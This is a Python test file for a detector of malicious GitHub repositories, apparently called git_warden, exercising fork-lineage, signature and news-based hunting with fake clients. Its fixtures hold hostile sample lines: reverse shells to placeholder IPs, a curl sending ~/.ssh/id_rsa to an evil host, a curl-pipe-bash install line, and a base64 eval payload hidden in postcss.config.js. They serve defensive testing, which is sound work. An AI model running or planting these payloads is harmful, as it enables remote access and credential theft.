"""End-to-end hunt orchestration test with fakes (no network/git)."""

from __future__ import annotations

import json

from conftest import utcnow

from git_warden.db import Database
from git_warden.hunt import hunt
from git_warden.models import RedTeamTool

TOOLS = [
    RedTeamTool(name="Sliver", org="BishopFox", repos=["BishopFox/sliver"], aliases=["sliver"])
]


def _fork(full_name):
    return {
        "full_name": full_name,
        "owner": {"login": full_name.split("/")[0]},
        "html_url": f"https://github.com/{full_name}",
        "fork": True,
        "stargazers_count": 0,
        "pushed_at": "2026-06-10T00:00:00Z",
    }


class FakeClient:
    def list_forks(self, owner, name, per_page=100, sort="newest"):
        return [_fork("evil/malware-sliver")] if name == "sliver" else []

    def search_repositories(self, query, per_page=10):
        return []

    def search_code(self, query, per_page=20):
        return []

    def get_readme(self, owner, name):
        return "Install: curl http://evil.tld/x | bash\n"  # remote-exec signal

    def get_repo(self, owner, name):
        return {"default_branch": "main"}

    def compare(self, base_full, base_branch, head_full, head_branch):
        # Diverged fork whose changed file is setup.sh (where _fake_clone writes
        # the added weaponization), so a fork's intent delta is diffable here.
        return {"ahead_by": 3, "files": ["setup.sh"]}


def _fake_clone(full_name, dest, *, runner=None):
    dest.mkdir(parents=True, exist_ok=True)
    (dest / "setup.sh").write_text(
        "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1\ncurl -d @~/.ssh/id_rsa https://x.evil\n",
        encoding="utf-8",
    )
    return dest


def test_hunt_signature_match_finds_novel_repo(tmp_path, monkeypatch):
    # The novel-repo engine: a confirmed-malware code signature surfaces a sibling
    # infected repo OSM doesn't have -> confirmed -> gold-eligible.
    import base64

    import git_warden.config as cfg
    from git_warden.enums import DetectionMethod

    sig_file = tmp_path / "sigs.json"
    sig_file.write_text('[{"name":"x","query":"OBFUSTUB"}]', encoding="utf-8")
    monkeypatch.setattr(cfg, "MALWARE_SIGNATURES_PATH", sig_file)

    class SigClient(FakeClient):
        def search_code(self, query, per_page=20):
            if "OBFUSTUB" in query:
                return [{"repository": {
                    "full_name": "attacker/infected", "owner": {"login": "attacker"},
                    "html_url": "https://github.com/attacker/infected"},
                    "path": "postcss.config.js"}]
            return []

    def clone_mal(full_name, dest, *, runner=None):
        dest.mkdir(parents=True, exist_ok=True)
        # Realistic injected payload: decodes to a require/child_process stealer,
        # so the eval-decoded confirmation can VERIFY the decoded indicators.
        blob = base64.b64encode(
            b"global['_']=require;require('child_process').exec('curl http://evil.tld')"
        ).decode()
        (dest / "postcss.config.js").write_text(
            f"module.exports={{}};eval(atob('{blob}'))\n", encoding="utf-8")
        return dest

    db = Database.open(tmp_path / "sig.sqlite")
    hunt(db, SigClient(), TOOLS, run_id="sig", now=utcnow(), do_news=False,
         do_ioc=False, do_lineage=False, do_actor=False, do_enrich=False, do_osm=False,
         do_signature=True, do_tier2=True, clone=clone_mal)
    row = db.conn.execute(
        "SELECT status, detection_method FROM repo_findings WHERE full_name = ?",
        ("attacker/infected",)).fetchone()
    assert row is not None
    assert row["detection_method"] == DetectionMethod.SIGNATURE_MATCH.value
    assert row["status"] == "confirmed"
    assert any(r["full_name"] == "attacker/infected" for r in db.undelivered_gold())
    # The mined signature is recorded for future hunts (the learning loop).
    assert db.learned_signatures()
    db.close()


def test_hunt_osm_repo_validation_confirms(tmp_path):
    # do_osm clones OSM-labeled repos directly and confirms genuine ones.
    from git_warden.enums import ArtifactType, DetectionMethod, FeedSource
    from git_warden.models import MaliciousArtifact

    db = Database.open(tmp_path / "osm.sqlite")
    db.start_run("seed", utcnow())
    db.upsert_artifact(MaliciousArtifact(
        artifact_type=ArtifactType.REPO, name="lurer/wallet-task", ecosystem="github",
        source=FeedSource.OPEN_SOURCE_MALWARE,
        raw_payload={"resource_identifier": "https://github.com/lurer/wallet-task"}), "seed")

    def clone_mal(full_name, dest, *, runner=None):
        dest.mkdir(parents=True, exist_ok=True)
        (dest / "run.sh").write_text("bash -i >& /dev/tcp/9.9.9.9/443 0>&1\n", encoding="utf-8")
        return dest

    hunt(db, FakeClient(), TOOLS, run_id="osm-run", now=utcnow(), do_news=False,
         do_ioc=False, do_lineage=False, do_actor=False, do_enrich=False, do_osm=True,
         do_tier2=True, clone=clone_mal)
    row = db.conn.execute(
        "SELECT status, detection_method FROM repo_findings WHERE full_name = ?",
        ("lurer/wallet-task",)).fetchone()
    assert row is not None
    assert row["detection_method"] == DetectionMethod.OSM_REPOSITORY.value
    assert row["status"] == "confirmed"
    db.close()


def test_hunt_lineage_weaponized_fork_confirmed_but_not_published(tmp_path):
    # A diverged fork that ADDED weaponization is verified internally (confirmed,
    # so its added-malware IOCs feed the learning loop) -- but a red-team clone is
    # ONLY a breadcrumb: it is NEVER published to the Wall of Shame or gold feed.
    db = Database.open(tmp_path / "h.sqlite")
    delivered = []

    summary = hunt(
        db, FakeClient(), TOOLS,
        run_id="hunt-1", now=utcnow(), do_news=False,
        do_ioc=False, do_lineage=True, do_tier2=True, gold=True,
        clone=_fake_clone,
        notifier=lambda cluster: (delivered.extend(r["full_name"] for r in cluster) or True),
    )

    assert summary["counts"]["candidates"] == 1
    assert summary["counts"]["confirmed"] == 1     # verified (for IOC mining)
    assert summary["counts"]["gold_delivered"] == 0  # breadcrumb: never delivered
    assert delivered == []
    assert db.published_findings() == []           # never on the Wall of Shame

    row = db.findings_by_status("confirmed")[0]
    assert row["full_name"] == "evil/malware-sliver"
    payload = json.loads(row["raw_payload"])
    assert row["code_hash"]                        # still fingerprinted for dedup
    assert payload.get("bash_findings")            # evidence retained internally
    db.close()


def test_hunt_limit_caps_candidates(tmp_path):
    db = Database.open(tmp_path / "h3.sqlite")

    class MultiForkClient(FakeClient):
        def list_forks(self, owner, name, per_page=100, sort="newest"):
            return [_fork(f"evil/sliver-clone-{i}") for i in range(5)] if name == "sliver" else []

    summary = hunt(
        db, MultiForkClient(), TOOLS,
        run_id="hunt-3", now=utcnow(), do_news=False,
        do_ioc=False, do_lineage=True, do_tier2=False, limit=2,
    )
    assert summary["counts"]["candidates"] == 2  # capped from 5
    db.close()


def test_rank_and_cap_prioritizes_precision_and_caps_noisy_sources():
    # run-4 (2026-07-02): 120 package_ref candidates devoured the whole budget,
    # starving signature_match (100% precision). Ranking must keep every
    # high-precision lead and cap package_ref's share.
    from git_warden.enums import DetectionMethod
    from git_warden.hunt import rank_and_cap_candidates
    from git_warden.models import RepoFinding

    sig = [RepoFinding(full_name=f"sig/repo{i}",
                       detection_method=DetectionMethod.SIGNATURE_MATCH) for i in range(5)]
    pkg = [RepoFinding(full_name=f"pkg/repo{i}", detection_method=DetectionMethod.PACKAGE_REF,
                       matched_iocs=["a", "b", "c"]) for i in range(60)]  # many IOCs each
    kept = rank_and_cap_candidates(sig + pkg, limit=20)
    methods = [f.detection_method for f in kept]
    assert len(kept) == 20
    # every signature_match lead survived despite package_ref's volume + IOC count
    assert methods.count(DetectionMethod.SIGNATURE_MATCH) == 5
    # package_ref hard-capped at max(15, 20//4)=15, not allowed to take all 15+ slots beyond
    assert methods.count(DetectionMethod.PACKAGE_REF) == 15


def test_rank_and_cap_backfills_when_only_noisy_sources_present():
    # If package_ref is the ONLY source (nothing better to find), it still fills
    # the budget -- an empty slot is worse than a capped-source lead.
    from git_warden.enums import DetectionMethod
    from git_warden.hunt import rank_and_cap_candidates
    from git_warden.models import RepoFinding

    pkg = [RepoFinding(full_name=f"pkg/repo{i}",
                       detection_method=DetectionMethod.PACKAGE_REF) for i in range(40)]
    kept = rank_and_cap_candidates(pkg, limit=20)
    assert len(kept) == 20


def test_hunt_without_tier2_leaves_candidates_screened(tmp_path):
    db = Database.open(tmp_path / "h2.sqlite")
    summary = hunt(
        db, FakeClient(), TOOLS,
        run_id="hunt-2", now=utcnow(), do_news=False,
        do_ioc=False, do_lineage=True, do_tier2=False, gold=False,
    )
    assert summary["counts"]["confirmed"] == 0
    assert summary["counts"]["screened"] == 1
    assert not db.findings_by_status("confirmed")
    db.close()


def test_hunt_uses_work_dir_and_cleans_up(tmp_path, monkeypatch):
    # GW_WORK_DIR honored, and scratch fully removed even with read-only files.
    import os
    import stat

    import git_warden.config as cfg
    workroot = tmp_path / "scratch"
    workroot.mkdir()
    monkeypatch.setattr(cfg, "WORK_DIR", workroot)

    seen = {}

    def ro_clone(full_name, dest, *, runner=None):
        dest.mkdir(parents=True, exist_ok=True)
        seen["workdir"] = dest.parent
        (dest / "implant.sh").write_text(
            "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1\n", encoding="utf-8"
        )
        gitdir = dest / ".git"
        gitdir.mkdir()
        pack = gitdir / "pack-x.idx"
        pack.write_text("x", encoding="utf-8")
        os.chmod(pack, stat.S_IREAD)  # git leaves read-only pack files behind
        return dest

    db = Database.open(tmp_path / "wd.sqlite")
    hunt(db, FakeClient(), TOOLS, run_id="hunt-wd", now=utcnow(), do_news=False,
         do_ioc=False, do_lineage=True, do_actor=False, do_tier2=True, clone=ro_clone)
    db.close()

    assert seen["workdir"].parent == workroot       # scratch landed under WORK_DIR
    assert list(workroot.iterdir()) == []           # fully cleaned; no husks


def test_hunt_work_dir_falls_back_to_system_temp(tmp_path, monkeypatch):
    import tempfile
    from pathlib import Path

    import git_warden.config as cfg
    monkeypatch.setattr(cfg, "WORK_DIR", None)

    seen = {}

    def clone_ok(full_name, dest, *, runner=None):
        dest.mkdir(parents=True, exist_ok=True)
        seen["workdir"] = dest.parent
        (dest / "x.sh").write_text("echo hi\n", encoding="utf-8")
        return dest

    db = Database.open(tmp_path / "wd2.sqlite")
    hunt(db, FakeClient(), TOOLS, run_id="hunt-wd2", now=utcnow(), do_news=False,
         do_ioc=False, do_lineage=True, do_actor=False, do_tier2=True, clone=clone_ok)
    db.close()

    assert seen["workdir"].resolve().parent == Path(tempfile.gettempdir()).resolve()
    assert not seen["workdir"].exists()  # cleaned up


class _MirrorClient(FakeClient):
    def get_repo(self, owner, name):
        return {"default_branch": "main"}

    def compare(self, base_full, base_branch, head_full, head_branch):
        return {"ahead_by": 0, "files": []}  # unmodified mirror


class _DivergedClient(FakeClient):
    def get_repo(self, owner, name):
        return {"default_branch": "main"}

    def compare(self, base_full, base_branch, head_full, head_branch):
        return {"ahead_by": 5, "files": ["setup.sh"]}  # diverged, changed setup.sh


def test_hunt_drops_unmodified_red_team_fork(tmp_path):
    # P1: a fork identical to the upstream tool is rejected, never gold.
    db = Database.open(tmp_path / "mir.sqlite")
    hunt(db, _MirrorClient(), TOOLS, run_id="hunt-mir", now=utcnow(), do_news=False,
         do_ioc=False, do_lineage=True, do_actor=False, do_tier2=True, clone=_fake_clone)
    assert not db.findings_by_status("confirmed")
    assert db.findings_by_status("rejected")  # mirror rejected
    db.close()


def test_hunt_confirms_weaponized_red_team_fork(tmp_path):
    # P1: a diverged fork whose changed files carry exfil/cred-theft confirms.
    db = Database.open(tmp_path / "div.sqlite")
    hunt(db, _DivergedClient(), TOOLS, run_id="hunt-div", now=utcnow(), do_news=False,
         do_ioc=False, do_lineage=True, do_actor=False, do_tier2=True, clone=_fake_clone)
    assert db.findings_by_status("confirmed")  # weaponization in diverged file
    db.close()


def test_hunt_lineage_name_match_is_breadcrumb(tmp_path):
    # A repo that merely SHARES a pinned tool's name (a cheatsheet, a re-host, a
    # name collision like CovenantSQL) is not a fork -> no upstream delta to
    # judge -> breadcrumb, never pinned, even though its docs carry offensive
    # example commands that would confirm on a full scan.
    class NameMatchClient(FakeClient):
        def list_forks(self, owner, name, per_page=100, sort="newest"):
            return []

        def search_repositories(self, query, per_page=10):
            if "sliver" in query.lower():
                return [{"full_name": "writeups/sliver-cheatsheet",
                         "owner": {"login": "writeups"},
                         "html_url": "https://github.com/writeups/sliver-cheatsheet",
                         "fork": False, "stargazers_count": 5,
                         "pushed_at": "2026-06-10T00:00:00Z"}]
            return []

    def clone_cheatsheet(full_name, dest, *, runner=None):
        dest.mkdir(parents=True, exist_ok=True)
        (dest / "README.md").write_text(  # offensive EXAMPLES, not weaponization
            "## Example\nbash -i >& /dev/tcp/1.2.3.4/4444 0>&1\n"
            "curl -d @~/.ssh/id_rsa https://x.evil\n", encoding="utf-8")
        return dest

    db = Database.open(tmp_path / "nm.sqlite")
    summary = hunt(db, NameMatchClient(), TOOLS, run_id="nm", now=utcnow(), do_news=False,
                   do_ioc=False, do_lineage=True, do_actor=False, do_tier2=True,
                   clone=clone_cheatsheet)
    row = db.conn.execute(
        "SELECT status, detection_method FROM repo_findings WHERE full_name = ?",
        ("writeups/sliver-cheatsheet",)).fetchone()
    assert row is not None
    assert row["detection_method"] == "redteam_lineage"
    assert row["status"] != "confirmed"            # breadcrumb, NOT pinned
    assert not db.findings_by_status("confirmed")
    assert summary["counts"]["redteam_breadcrumbs"] >= 1
    db.close()


def test_hunt_lineage_undiffable_fork_is_breadcrumb(tmp_path):
    # A fork we cannot diff against upstream (compare unavailable) has no
    # obtainable intent delta -> breadcrumb, NOT an indiscriminate full-scan
    # confirmation on the tool's own offensive code.
    class NoCompareClient(FakeClient):
        def compare(self, *a, **k):
            raise RuntimeError("compare unavailable (rate limited)")

    db = Database.open(tmp_path / "nc.sqlite")
    summary = hunt(db, NoCompareClient(), TOOLS, run_id="nc", now=utcnow(), do_news=False,
                   do_ioc=False, do_lineage=True, do_actor=False, do_tier2=True,
                   clone=_fake_clone)
    assert not db.findings_by_status("confirmed")
    assert summary["counts"]["redteam_breadcrumbs"] >= 1
    db.close()


def test_hunt_redteam_tool_via_nonlineage_pivot_is_breadcrumb(tmp_path, monkeypatch):
    # The breadcrumb bug: a red-team TOOL (named like a pinned tool) surfaced by a
    # NON-lineage pivot (here: signature search) must NOT be pinned malicious on
    # its own offensive code. With no upstream to diff, a reverse shell is the
    # tool's purpose, not weaponization -> screened breadcrumb, never confirmed.
    import git_warden.config as cfg
    from git_warden.enums import DetectionMethod

    sig_file = tmp_path / "sigs.json"
    sig_file.write_text('[{"name":"x","query":"SLIVERSIG"}]', encoding="utf-8")
    monkeypatch.setattr(cfg, "MALWARE_SIGNATURES_PATH", sig_file)

    class SigClient(FakeClient):
        def search_code(self, query, per_page=20):
            if "SLIVERSIG" in query:
                return [{"repository": {
                    "full_name": "mallory/sliver", "owner": {"login": "mallory"},
                    "html_url": "https://github.com/mallory/sliver"},
                    "path": "implant.sh"}]
            return []

    def clone_tool(full_name, dest, *, runner=None):
        dest.mkdir(parents=True, exist_ok=True)
        # The red-team tool's OWN offensive code (a reverse shell). Tier-A alone,
        # so WITHOUT the breadcrumb gate this would be confirmed malicious.
        (dest / "implant.sh").write_text(
            "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1\n", encoding="utf-8")
        return dest

    db = Database.open(tmp_path / "rt.sqlite")
    summary = hunt(
        db, SigClient(), TOOLS, run_id="rt", now=utcnow(), do_news=False,
        do_ioc=False, do_lineage=False, do_actor=False, do_enrich=False, do_osm=False,
        do_signature=True, do_tier2=True, clone=clone_tool)
    row = db.conn.execute(
        "SELECT status, detection_method, reasoning FROM repo_findings WHERE full_name = ?",
        ("mallory/sliver",)).fetchone()
    assert row is not None
    assert row["detection_method"] == DetectionMethod.SIGNATURE_MATCH.value
    assert row["status"] != "confirmed"           # breadcrumb, NOT pinned
    assert "red-team tool" in (row["reasoning"] or "")
    assert not db.findings_by_status("confirmed")  # nothing pinned to the registry
    assert summary["counts"]["redteam_breadcrumbs"] == 1
    db.close()


def test_hunt_trojaned_impersonation_still_confirms(tmp_path, monkeypatch):
    # Guard the precision boundary: a homoglyph/typosquat impersonation of a tool
    # is NOT whitelisted as a breadcrumb (raw name differs), so a real implant in
    # it still confirms.
    import git_warden.config as cfg

    sig_file = tmp_path / "sigs.json"
    sig_file.write_text('[{"name":"x","query":"SLIVERSIG"}]', encoding="utf-8")
    monkeypatch.setattr(cfg, "MALWARE_SIGNATURES_PATH", sig_file)

    class SigClient(FakeClient):
        def search_code(self, query, per_page=20):
            if "SLIVERSIG" in query:
                return [{"repository": {  # "sl1ver": typosquat, raw name != "sliver"
                    "full_name": "mallory/sl1ver", "owner": {"login": "mallory"},
                    "html_url": "https://github.com/mallory/sl1ver"},
                    "path": "implant.sh"}]
            return []

    def clone_mal(full_name, dest, *, runner=None):
        dest.mkdir(parents=True, exist_ok=True)
        (dest / "implant.sh").write_text(
            "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1\n", encoding="utf-8")
        return dest

    db = Database.open(tmp_path / "imp.sqlite")
    hunt(db, SigClient(), TOOLS, run_id="imp", now=utcnow(), do_news=False,
         do_ioc=False, do_lineage=False, do_actor=False, do_enrich=False, do_osm=False,
         do_signature=True, do_tier2=True, clone=clone_mal)
    assert any(r["full_name"] == "mallory/sl1ver"
               for r in db.findings_by_status("confirmed"))
    db.close()


def test_hunt_news_pivot_creates_news_mention_candidate(tmp_path):
    # Hacker News / Google News pivot (2026-07-02): a repo NAMED in a malware
    # writeup becomes a NEWS_MENTION candidate, screened through ORDINARY Tier-1
    # scoring like a cold search hit -- never auto-escalated to Tier-2 the way
    # package_ref/osm_repository are (weaker, unverified signal).
    from conftest import FakeHttpClient

    from git_warden.enums import DetectionMethod

    hn_json = json.dumps({"hits": [{
        "title": "New npm worm found in the wild",
        "url": "https://blog.example.com/worm-writeup",
        "story_text": "Payload mirrored at https://github.com/newsattacker/worm-repo",
        "objectID": "1",
    }]})

    db = Database.open(tmp_path / "news.sqlite")
    hunt(db, FakeClient(), TOOLS, run_id="news-1", now=utcnow(),
         do_news=True, news_http=FakeHttpClient(hn_json),
         do_ioc=False, do_lineage=False, do_actor=False, do_enrich=False,
         do_osm=False, do_signature=False, do_tier2=False)

    row = db.conn.execute(
        "SELECT detection_method, status FROM repo_findings WHERE full_name = ?",
        ("newsattacker/worm-repo",),
    ).fetchone()
    assert row is not None
    assert row["detection_method"] == DetectionMethod.NEWS_MENTION.value
    # do_tier2=False -> nothing can be CONFIRMED this run regardless of method.
    assert row["status"] != "confirmed"
    db.close()
